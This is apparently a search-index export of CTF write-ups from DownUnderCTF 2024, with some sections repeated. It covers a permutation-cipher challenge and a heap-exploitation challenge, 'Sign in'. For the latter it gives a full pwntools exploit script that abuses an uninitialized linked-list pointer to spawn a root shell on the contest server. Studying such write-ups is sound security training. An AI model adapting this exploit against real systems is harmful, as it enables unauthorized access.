resolved_positions = [ - 1 ] * 16 for i in range ( 16 ): # iterate over each position 0..15 and analyze what a resulting possible positions (aka candidates) candidates = [] for j in range ( 16 ): # if input character at position i is same as output character at position j for both lines # then this position j is one of candidate shuffles if out1 [ j ] == in1 [ i ] and out2 [ j ] == in2 [ i ]: candidates . append ( j ) print ( i , candidates ) if len ( candidates ) == 1 : # if number of candidates is 1, then we uniquely identifies transformation and can store it resolved_positions [ i ] = candidates [ 0 ] print ( resolved_positions ) challenge = \"owuwspdgrtejiiud\" for i in range ( 16 ): print ( challenge [ resolved_positions [ i ]], end = \"\" ) Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Shufflebox"},{"location":"shufflebox/#prologue","text":"Difficulty: beginner Category: cryptography Solved: 582 Description I've learned that if you shuffle your text, it's elrlay hrda to tlle htaw eht nioiglra nutpi aws. Find the text censored with question marks in output_censored.txt and surround it with DUCTF{}. Input files: shufflebox.py 1 2 3 4 5 6 7 8 9 10 11 12 import random PERM = list ( range ( 16 )) random . shuffle ( PERM ) def apply_perm ( s ): assert len ( s ) == 16 return '' . join ( s [ PERM [ p ]] for p in range ( 16 )) for line in open ( 0 ): line = line . strip () print ( line , '->' , apply_perm ( line )) output_censored.txt 1 2 3 aaaabbbbccccdddd -> ccaccdabdbdbbada abcdabcdabcdabcd -> bcaadbdcdbcdacab ???????????????? -> owuwspdgrtejiiud NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"shufflebox/#my-struggle","text":"First things first - review source code of the script that ciphers data. Explanation for relevant parts of the code added as comments: shuffle.py with comments 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PERM = list ( range ( 16 )) # create list of 16 elements 0, 1, 2, 3 ... 16 random . shuffle ( PERM ) # shuffle elements of the list in a random order, so now we have something like 15, 3, 1, 6 ... # key tranformation logic # PERM shuffle list is used as array of indices # For example if PERM was a list of 4 elements [2, 0, 3, 1] # then result string will first output charcter 2 then 0 and so on, ie 'abcd' -> 'cadb' def apply_perm ( s ): assert len ( s ) == 16 return '' . join ( s [ PERM [ p ]] for p in range ( 16 )) for line in open ( 0 ): # for each line of input apply transformation and print input and output line = line . strip () print ( line , '->' , apply_perm ( line )) Import note to make is that internal state of the cipher algorithm doesn't change and there is no nonce. In other words if we can infer PERM list from one line, we can recover all other inputs. Now that we understand how cipher algorithm works, lets review output file: output_censored.txt 1 2 3 aaaabbbbccccdddd -> ccaccdabdbdbbada abcdabcdabcdabcd -> bcaadbdcdbcdacab ???????????????? -> owuwspdgrtejiiud Looking at the first line we immediately spot the problem - there are 4 'a' in the input so we can't immediately tell where it was. Based on the first line aaaabbbbccccdddd -> ccaccdabdbdbbada , first character is moved in one of the following positions: [0] -> [2, 6, 13, 15] Given all rows are transformed exactly the same, we can use second row to narrow down positions of the first character: abcdabcdabcdabcd -> bcaadbdcdbcdacab : first character is moved into one of the following positions: [0] -> [2, 3, 12, 14] Now we can compare this two lists and see that only value 2 is present in both. Hence, first character of input is third character of output. Ie our answer will start with u . Although this problem can be solved by hand, I wrote a short stripe to print out all possible positions for each character of the input (although we were lucky with first character and found exact position, it is possible that for some positions we may have several candidates). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 in1 = \"aaaabbbbccccdddd\" out1 = \"ccaccdabdbdbbada\" in2 = \"abcdabcdabcdabcd\" out2 = \"bcaadbdcdbcdacab\" resolved_positions = [ - 1 ] * 16 for i in range ( 16 ): # iterate over each position 0..15 and analyze what a resulting possible positions (aka candidates) candidates = [] for j in range ( 16 ): # if input character at position i is same as output character at position j for both lines # then this position j is one of candidate shuffles if out1 [ j ] == in1 [ i ] and out2 [ j ] == in2 [ i ]: candidates . append ( j ) print ( i , candidates ) if len ( candidates ) == 1 : # if number of candidates is 1, then we uniquely identifies transformation and can store it resolved_positions [ i ] = candidates [ 0 ] output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 0 [2] 1 [15] 2 [13] 3 [6] 4 [12] 5 [9] 6 [7] 7 [11] 8 [3] 9 [0] 10 [1] 11 [4] 12 [14] 13 [5] 14 [10] 15 [8] This means that character 0 of answer is owuwspdgrtejiiud[2] , character 1 is owuwspdgrtejiiud[1] and so on. Following short script prints out the answer: 1 2 3 challenge = \"owuwspdgrtejiiud\" for i in range ( 16 ): print ( challenge [ resolved_positions [ i ]], end = \"\" ) Full solution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 in1 = \"aaaabbbbccccdddd\" out1 = \"ccaccdabdbdbbada\" in2 = \"abcdabcdabcdabcd\" out2 = \"bcaadbdcdbcdacab\" resolved_positions = [ - 1 ] * 16 for i in range ( 16 ): # iterate over each position 0..15 and analyze what a resulting possible positions (aka candidates) candidates = [] for j in range ( 16 ): # if input character at position i is same as output character at position j for both lines # then this position j is one of candidate shuffles if out1 [ j ] == in1 [ i ] and out2 [ j ] == in2 [ i ]: candidates . append ( j ) print ( i , candidates ) if len ( candidates ) == 1 : # if number of candidates is 1, then we uniquely identifies transformation and can store it resolved_positions [ i ] = candidates [ 0 ] print ( resolved_positions ) challenge = \"owuwspdgrtejiiud\" for i in range ( 16 ): print ( challenge [ resolved_positions [ i ]], end = \"\" )","title":"My struggle"},{"location":"shufflebox/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"sign_in/","text":"Prologue \u00b6 Difficulty: easy Category: binary exploitation Solved: 95 Description Please sign in as root to get a shell. Input files: sign-in.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/random.h> typedef struct { long uid ; char username [ 8 ]; char password [ 8 ]; } user_t ; typedef struct user_entry user_entry_t ; struct user_entry { user_t * user ; user_entry_t * prev ; user_entry_t * next ; }; user_entry_t user_list ; long UID = 1 ; void init () { setvbuf ( stdin , 0 , 2 , 0 ); setvbuf ( stdout , 0 , 2 , 0 ); } int menu () { int choice ; puts ( \"1. Sign up\" ); puts ( \"2. Sign in\" ); puts ( \"3. Remove account\" ); puts ( \"4. Get shell\" ); printf ( \"> \" ); scanf ( \"%d\" , & choice ); return choice ; } void sign_up () { user_t * user = malloc ( sizeof ( user_t )); user_entry_t * entry = malloc ( sizeof ( user_entry_t )); user -> uid = UID ++ ; printf ( \"username: \" ); read ( 0 , user -> username , 8 ); printf ( \"password: \" ); read ( 0 , user -> password , 8 ); entry -> user = user ; user_entry_t * curr = & user_list ; while ( curr -> next ) { curr = curr -> next ; } entry -> prev = curr ; curr -> next = entry ; } void remove_account ( int uid ) { user_entry_t * curr = & user_list ; do { if ( curr -> user -> uid == uid ) { if ( curr -> prev ) { curr -> prev -> next = curr -> next ; } if ( curr -> next ) { curr -> next -> prev = curr -> prev ; } free ( curr -> user ); free ( curr ); break ; } curr = curr -> next ; } while ( curr ); } long sign_in () { char username [ 9 ] = { 0 }; char password [ 9 ] = { 0 }; printf ( \"username: \" ); read ( 0 , username , 8 ); printf ( \"password: \" ); read ( 0 , password , 8 ); user_entry_t * curr = & user_list ; do { if ( memcmp ( curr -> user -> username , username , 8 ) == 0 && memcmp ( curr -> user -> password , password , 8 ) == 0 ) { printf ( \"Logging in as %s \\n \" , username ); return curr -> user -> uid ; } curr = curr -> next ; } while ( curr ); return -1 ; } int main () { init (); long uid = -1 ; user_t root = { . uid = 0 , . username = \"root\" , }; if ( getrandom ( root . password , 8 , 0 ) != 8 ) { exit ( 1 ); } user_list . next = NULL ; user_list . prev = NULL ; user_list . user = & root ; while ( 1 ) { int choice = menu (); if ( choice == 1 ) { sign_up (); } else if ( choice == 2 ) { uid = sign_in (); if ( uid == -1 ) { puts ( \"Invalid username or password!\" ); } } else if ( choice == 3 ) { if ( uid == -1 ) { puts ( \"Please sign in first!\" ); } else { remove_account ( uid ); uid = -1 ; } } else if ( choice == 4 ) { if ( uid == 0 ) { system ( \"/bin/sh\" ); } else { puts ( \"Please sign in as root first!\" ); } } else { exit ( 1 ); } } } sign-in binary NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Analysis \u00b6 user_entry structure is a typical implementation of doubly linked list ( wiki ). 1 2 3 4 5 struct user_entry { user_t * user ; user_entry_t * prev ; user_entry_t * next ; }; Example of memory layout of 3 user_entries (0x100000, 0x100040, 0x100080) with 3 user accounts (0x100020, 0x100060, 0x1000a0 (root, bob and alice)): g figure 1. Sample memory layout element0 user_entry 0x100000 user: 0x100020 prev: null next: 0x100040 element1 user_entry 0x100040 user: 0x100060 prev: 0x100000 next: 0x10080 element0:next->element1:head user0 user 0x100020 id: 0 username: root password: ???? element0:user->user0:head element1:prev->element0:head element2 user_entry 0x100080 user: 0x1000a0 prev: 0x100040 next: null element1:next->element2:head user1 user 0x100060 id: 1 username: bob password: password1 element1:user->user1:head element2:prev->element1:head user2 user 0x1000a0 id: 2 username: alice password: pasword2 element2:user->user2:head New entries created during signup: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void sign_up () { user_t * user = malloc ( sizeof ( user_t )); user_entry_t * entry = malloc ( sizeof ( user_entry_t )); # we allocate memory for user_entry user -> uid = UID ++ ; printf ( \"username: \" ); read ( 0 , user -> username , 8 ); printf ( \"password: \" ); read ( 0 , user -> password , 8 ); entry -> user = user ; # we set field ' user ' of the entry user_entry_t * curr = & user_list ; while ( curr -> next ) { curr = curr -> next ; } entry -> prev = curr ; # we set field ' prev ' of the entry curr -> next = entry ; } sign_up function sets values for user and prev fields, but it doesn't initialize value of next field. According to language specification, value of the uninitialized variable is undeterminate. In practice, it will be the value that was in the RAM before allocation. This value will be interpreted as address of the next entry in the list. List traversal of the sign_in function will go to this \"undeterminate\" address and interpret that memory as user_entry structure. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 long sign_in () { char username [ 9 ] = { 0 }; char password [ 9 ] = { 0 }; printf ( \"username: \" ); read ( 0 , username , 8 ); printf ( \"password: \" ); read ( 0 , password , 8 ); user_entry_t * curr = & user_list ; # set curr variable to the head of the list do { # read username and password from curr entry if ( memcmp ( curr -> user -> username , username , 8 ) == 0 && memcmp ( curr -> user -> password , password , 8 ) == 0 ) { printf ( \"Logging in as %s \\n \" , username ); return curr -> user -> uid ; } curr = curr -> next ; # set curr variable to the next entry } while ( curr ); # use of uninitialized memory : check if its not null - continue iteration return -1 ; } When we delete user, memory would look like: 2 user_entries with addresses 0x100000, 0x100040 2 user accounts with addresses 0x100020, 0x100060 (root, bob) two recycled memory blocks that will be available for view allocations: 0x100080, 0x1000a0 g element0 user_entry 0x100000 user: 0x100020 prev: null next: 0x100040 element1 user_entry 0x100040 user: 0x100060 prev: 0x100000 next: null element0:next->element1:head user0 user 0x100020 id: 0 username: root password: ???? element0:user->user0:head element1:prev->element0:head user1 user 0x100060 id: 1 username: bob password: password1 element1:user->user1:head g figure 2. Memory layout after user deletion element2 recycled memory 0x100080 0x100040 0x1000a0 0 user2 recycled memory 0x1000a0 2 alice pasword2 Note that recycled memory is not zeroed out, it still contains data. Now if we create a new user, recycled memory 0x100080 and 0x1000a0 will be reused for user account and user entry. Note that last freed blocked in remove_account item will be used first by malloc in sign_up ( LIFO , effectively swaping addresses of user_entry and user account). This change is highlighted compared to figure 1 : g figure 3. Memory layout after new user re-creation element0 user_entry 0x100000 prev: null user: 0x100020 next: 0x100040 element1 user_entry 0x100040 prev: 0x100000 user: 0x100060 next: 0x1000a0 element0:next->element1:head user0 user 0x100020 id: 0 username: root password: ???? element0:user->user0:head element1:prev->element0:head element2 user_entry 0x1000a0 prev: 0x100040 user: 0x100080 next: password2 element1:next->element2:head user1 user 0x100060 id: 1 username: bob password: password1 element1:user->user1:head element2:prev->element1:head user2 user 0x100080 id: 3 username: james password: password3 element2:user->user2:head Exploit \u00b6 As you can see on figure3, password of deleted user is used as address of the next user entry. So our plan is: Find memory address that can be interpreted as user entry for account with id 0 and username and password that we know. Create user account using address from step 1 as a password. Delete the account. Create new account, this will trigger the exploit and create new entry with uninitialized next value. It will be address we selected in step 1. Not so \"undeterminate\", huh? Sign in with username and password that we got in step 1. Step 1 : scan memory We are looking for address that points to user account structure: 1 2 3 4 5 typedef struct { long uid ; char username [ 8 ]; char password [ 8 ]; } Uid should be 0, and username and password any as long as we know it. Time to check binary protection: 1 2 3 $ checksec --file = app RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH 54 Symbols No 0 2 app PIE is disabled. This means code will be loaded always to the same addresses. This looks like the best place to look for pointer to user account as its value will be same every time app launched. Module entry point is 0x400000, we can see it in process mapping: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ cat /proc/5539/maps 00400000 -00401000 r--p 00000000 08 :01 1209740 /home/kali/Downloads/app 00401000 -00402000 r-xp 00001000 08 :01 1209740 /home/kali/Downloads/app 00402000 -00403000 r--p 00002000 08 :01 1209740 /home/kali/Downloads/app 00403000 -00404000 r--p 00002000 08 :01 1209740 /home/kali/Downloads/app 00404000 -00405000 rw-p 00003000 08 :01 1209740 /home/kali/Downloads/app 7f70658c0000-7f70658c3000 rw-p 00000000 00 :00 0 7f70658c3000-7f70658e9000 r--p 00000000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f70658e9000-7f7065a40000 r-xp 00026000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f7065a40000-7f7065a95000 r--p 0017d000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f7065a95000-7f7065a99000 r--p 001d1000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f7065a99000-7f7065a9b000 rw-p 001d5000 08 :01 440309 /usr/lib/x86_64-linux-gnu/libc.so.6 7f7065a9b000-7f7065aa8000 rw-p 00000000 00 :00 0 7f7065ac9000-7f7065acb000 rw-p 00000000 00 :00 0 7f7065acb000-7f7065acc000 r--p 00000000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f7065acc000-7f7065af1000 r-xp 00001000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f7065af1000-7f7065afb000 r--p 00026000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f7065afb000-7f7065afd000 r--p 00030000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f7065afd000-7f7065aff000 rw-p 00032000 08 :01 440306 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffe04ef5000-7ffe04f16000 rw-p 00000000 00 :00 0 [ stack ] 7ffe04fc4000-7ffe04fc8000 r--p 00000000 00 :00 0 [ vvar ] 7ffe04fc8000-7ffe04fca000 r-xp 00000000 00 :00 0 [ vdso ] Script to find address that points to memory that can be interpreted as user account with id 0: script.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # start scan of memory at base address of the application module_start = 0x400000 # we only interested in readonly memory (24 bytes padding for safety as user structure is 24 bytes long) module_end = 0x404000 - 24 # iterate over memory addresses for i in range ( module_start , module_end ): # read value stored at i (unpack convertes from little endian byte array into int) addr = unpack ( elfexe . read ( i , 8 )) # if value i is a number in range module_start..module_end it can be interpreted as address. # Also check value that address i is pointing to, target application will treat that value as user ID. # We are looking for user ID equal to 0 if module_start < addr < module_end and unpack ( elfexe . read ( addr , 8 )) == 0 : fake_root_entry = i break # use fake user entry that we found to calculate user account details fake_account_address = unpack ( elfexe . read ( fake_root_entry , 8 )) # first field of user structuture is user ID 8 bytes fake_account_id = unpack ( elfexe . read ( fake_account_address , 8 )) # second field (offset 8) in user structure is username 8 bytes fake_account_username = elfexe . read ( fake_account_address + 8 , 8 ) # third field (offset sum of length previous files 8 + 8) in user structure is password 8 bytes fake_account_password = elfexe . read ( fake_account_address + 16 , 8 ) print ( f \"fake entry address { hex ( fake_root_entry ) } \" ) print ( f \" { fake_account_id =} \" ) print ( f \"fake account username { binascii . hexlify ( fake_account_username ) } \" ) print ( f \"fake account password { binascii . hexlify ( fake_account_password ) } \" ) output.txt 1 2 3 4 fake entry address 0x403eb8 fake_account_id = 0 fake account username b '0000000000000000' fake account password b '0000000000000000' Steps 2-5 : exploit I used pwntools to automate necessary steps (account creation, sign in, deletion etc...): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 io . recvuntil ( b \"> \" ) # wait till target application is initialized io . sendline ( b '1' ) # enter choice 1 - create account io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"one\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( pack ( fake_root_entry )) # send address as fake root entry as password (converting into little endian) io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '2' ) # enter choice 2 - sign in io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"one\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( pack ( fake_root_entry )) # enter password io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '3' ) # enter choice 3 - remove account io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '1' ) # enter choice 1 - create account io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"two\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( b \"two\" ) # enter password io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '2' ) # enter choice 2 - signup io . recvuntil ( b \":\" ) # wait username prompt # enter username and password of our fake user account # note that both fields are concatenated. # if we use sendline(fake_account_username) then sendline(fake_account_password) # then first sendline would append '\\n' and password wont match io . sendline ( fake_account_username + fake_account_password ) io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '4' ) # enter choice 4 - Get shell And full script: solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 from pwn import * context . binary = elfexe = ELF ( './app' ) libc = elfexe . libc context . log_level = 'warn' arguments = [] if args [ 'REMOTE' ]: remote_server = '2024.ductf.dev' remote_port = 30022 io = remote ( remote_server , remote_port ) else : io = process ([ elfexe . path ] + arguments ) # start scan of memory at base address of the application module_start = 0x400000 # we only interested in readonly memory (16 bytes padding for safety as user structure is 24 bytes long) module_end = 0x404000 - 24 # iterate over memory addresses for i in range ( module_start , module_end ): # read value stored at i (unpack convertes from little endian byte array into int) addr = unpack ( elfexe . read ( i , 8 )) # if value i is address in range module_start..module_end # then read value that i is pointing to - its user ID, if user ID is 0 then we found good address # to use as fake user entry if module_start < addr < module_end and unpack ( elfexe . read ( addr , 8 )) == 0 : fake_root_entry = i break # use fake user entry that we found calculate user account details fake_account_address = unpack ( elfexe . read ( fake_root_entry , 8 )) fake_account_id = unpack ( elfexe . read ( fake_account_address , 8 )) fake_account_username = elfexe . read ( fake_account_address + 8 , 8 ) fake_account_password = elfexe . read ( fake_account_address + 16 , 8 ) print ( f \"fake entry address { hex ( fake_root_entry ) } \" ) print ( f \" { fake_account_id =} \" ) print ( f \"fake account username { binascii . hexlify ( fake_account_username ) } \" ) print ( f \"fake account password { binascii . hexlify ( fake_account_password ) } \" ) io . recvuntil ( b \"> \" ) # wait till target application initialised io . sendline ( b '1' ) # enter choice 1 - create account io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"one\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( pack ( fake_root_entry )) # send address as fake root entry as password (converting into little endian) io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '2' ) # enter choice 2 - sign in io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"one\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( pack ( fake_root_entry )) # enter password io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '3' ) # enter choice 3 - remove account io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '1' ) # enter choice 1 - create account io . recvuntil ( b \":\" ) # wait username prompt io . sendline ( b \"two\" ) # enter username io . recvuntil ( b \":\" ) # wait password prompt io . sendline ( b \"two\" ) # enter password io . recvuntil ( b \"> \" ) # wait prompt io . sendline ( b '2' ) # enter choice 2 - signup io . recvuntil ( b \":\" ) # wait username prompt # enter username and password of the fake entity that has id 0 # note that both fields are concatenated. # if we use sendline(fake_account_username) then sendline(fake_account_password) # then because sendline appends '\\n' it would be treated as part of password and sign in fails io . sendline ( fake_account_username + fake_account_password ) io . recvuntil ( b \"> \" ) # failed prompt io . sendline ( b '4' ) # enter choice 4 - Get shell # we should have remove shell now - switch to interactive mode io . interactive () io . close () Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Sign in"},{"location":"sign_in/#prologue","text":"Difficulty: easy Category: binary exploitation Solved: 95 Description Please sign in as root to get a shell. Input files: sign-in.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/random.h> typedef struct { long uid ; char username [ 8 ]; char password [ 8 ]; } user_t ; typedef struct user_entry user_entry_t ; struct user_entry { user_t * user ; user_entry_t * prev ; user_entry_t * next ; }; user_entry_t user_list ; long UID = 1 ; void init () { setvbuf ( stdin , 0 , 2 , 0 ); setvbuf ( stdout , 0 , 2 , 0 ); } int menu () { int choice ; puts ( \"1. Sign up\" ); puts ( \"2. Sign in\" ); puts ( \"3. Remove account\" ); puts ( \"4. Get shell\" ); printf ( \"> \" ); scanf ( \"%d\" , & choice ); return choice ; } void sign_up () { user_t * user = malloc ( sizeof ( user_t )); user_entry_t * entry = malloc ( sizeof ( user_entry_t )); user -> uid = UID ++ ; printf ( \"username: \" ); read ( 0 , user -> username , 8 ); printf ( \"password: \" ); read ( 0 , user -> password , 8 ); entry -> user = user ; user_entry_t * curr = & user_list ; while ( curr -> next ) { curr = curr -> next ; } entry -> prev = curr ; curr -> next = entry ; } void remove_account ( int uid ) { user_entry_t * curr = & user_list ; do { if ( curr -> user -> uid == uid ) { if ( curr -> prev ) { curr -> prev -> next = curr -> next ; } if ( curr -> next ) { curr -> next -> prev = curr -> prev ; } free ( curr -> user ); free ( curr ); break ; } curr = curr -> next ; } while ( curr ); } long sign_in () { char username [ 9 ] = { 0 }; char password [ 9 ] = { 0 }; printf ( \"username: \" ); read ( 0 , username , 8 ); printf ( \"password: \" ); read ( 0 , password , 8 ); user_entry_t * curr = & user_list ; do { if ( memcmp ( curr -> user -> username , username , 8 ) == 0 && memcmp ( curr -> user -> password , password , 8 ) == 0 ) { printf ( \"Logging in as %s \\n \" , username ); return curr -> user -> uid ; } curr = curr -> next ; } while ( curr ); return -1 ; } int main () { init (); long uid = -1 ; user_t root = { . uid = 0 , . username = \"root\" , }; if ( getrandom ( root . password , 8 , 0 ) != 8 ) { exit ( 1 ); } user_list . next = NULL ; user_list . prev = NULL ; user_list . user = & root ; while ( 1 ) { int choice = menu (); if ( choice == 1 ) { sign_up (); } else if ( choice == 2 ) { uid = sign_in (); if ( uid == -1 ) { puts ( \"Invalid username or password!\" ); } } else if ( choice == 3 ) { if ( uid == -1 ) { puts ( \"Please sign in first!\" ); } else { remove_account ( uid ); uid = -1 ; } } else if ( choice == 4 ) { if ( uid == 0 ) { system ( \"/bin/sh\" ); } else { puts ( \"Please sign in as root first!\" ); } } else { exit ( 1 ); } } } sign-in binary NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"sign_in/#my-struggle","text":"","title":"My struggle"},{"location":"sign_in/#analysis","text":"user_entry structure is a typical implementation of doubly linked list ( wiki ). 1 2 3 4 5 struct user_entry { user_t * user ; user_entry_t * prev ; user_entry_t * next ; }; Example of memory layout of 3 user_entries (0x100000, 0x100040, 0x100080) with 3 user accounts (0x100020, 0x100060, 0x1000a0 (root, bob and alice)): g figure 1. Sample memory layout element0 user_entry 0x100000 user: 0x100020 prev: null next: 0x100040 element1 user_entry 0x100040 user: 0x100060 prev: 0x100000 next: 0x10080 element0:next->element1:head user0 user 0x100020 id: 0 username: root password: ???? element0:user->user0:head element1:prev->element0:head element2 user_entry 0x100080 user: 0x1000a0 prev: 0x100040 next: null element1:next->element2:head user1 user 0x100060 id: 1 username: bob password: password1 element1:user->user1:head element2:prev->element1:head user2 user 0x1000a0 id: 2 username: alice password: pasword2 element2:user->user2:head New entries created during signup: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void sign_up () { user_t * user = malloc ( sizeof ( user_t )); user_entry_t * entry = malloc ( sizeof ( user_entry_t )); # we allocate memory for user_entry user -> uid = UID ++ ; printf ( \"username: \" ); read ( 0 , user -> username , 8 ); printf ( \"password: \" ); read ( 0 , user -> password , 8 ); entry -> user = user ; # we set field ' user ' of the entry user_entry_t * curr = & user_list ; while ( curr -> next ) { curr = curr -> next ; } entry -> prev = curr ; # we set field ' prev ' of the entry curr -> next = entry ; } sign_up function sets values for user and prev fields, but it doesn't initialize value of next field. According to language specification, value of the uninitialized variable is undeterminate. In practice, it will be the value that was in the RAM before allocation. This value will be interpreted as address of the next entry in the list. List traversal of the sign_in function will go to this \"undeterminate\" address and interpret that memory as user_entry structure. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 long sign_in () { char username [ 9 ] = { 0 }; char password [ 9 ] = { 0 }; printf ( \"username: \" ); read ( 0 , username , 8 ); printf ( \"password: \" ); read ( 0 , password , 8 ); user_entry_t * curr = & user_list ; # set curr variable to the head of the list do { # read username and password from curr entry if ( memcmp ( curr -> user -> username , username , 8 ) == 0 && memcmp ( curr -> user -> password , password , 8 ) == 0 ) { printf ( \"Logging in as %s \\n \" , username ); return curr -> user -> uid ; } curr = curr -> next ; # set curr variable to the next entry } while ( curr ); # use of uninitialized memory : check if its not null - continue iteration return -1 ; } When we delete user, memory would look like: 2 user_entries with addresses 0x100000, 0x100040 2 user accounts with addresses 0x100020, 0x100060 (root, bob) two recycled memory blocks that will be available for view allocations: 0x100080, 0x1000a0 g element0 user_entry 0x100000 user: 0x100020 prev: null next: 0x100040 element1 user_entry 0x100040 user: 0x100060 prev: 0x100000 next: null element0:next->element1:head user0 user 0x100020 id: 0 username: root password: ???? element0:user->user0:head element1:prev->element0:head user1 user 0x100060 id: 1 username: bob password: password1 element1:user->user1:head g figure 2. Memory layout after user deletion element2 recycled memory 0x100080 0x100040 0x1000a0 0 user2 recycled memory 0x1000a0 2 alice pasword2 Note that recycled memory is not zeroed out, it still contains data. Now if we create a new user, recycled memory 0x100080 and 0x1000a0 will be reused for user account and user entry. Note that last freed blocked in remove_account item will be used first by malloc in sign_up ( LIFO , effectively swaping addresses of user_entry and user account). This change is highlighted compared to figure 1 : g figure 3. Memory layout after new user re-creation element0 user_entry 0x100000 prev: null user: 0x100020 next: 0x100040 element1 user_entry 0x100040 prev: 0x100000 user: 0x100060 next: 0x1000a0 element0:next->element1:head user0 user 0x100020 id: 0 username: root password: ???? element0:user->user0:head element1:prev->element0:head element2 user_entry 0x1000a0 prev: 0x100040 user: 0x100080 next: password2 element1:next->element2:head user1 user 0x100060 id: 1 username: bob password: password1 element1:user->user1:head element2:prev->element1:head user2 user 0x100080 id: 3 username: james password: password3 element2:user->user2:head","title":"Analysis"},{"location":"sign_in/#exploit","text":"As you can see on figure3, password of deleted user is used as address of the next user entry. So our plan is: Find memory address that can be interpreted as user entry for account 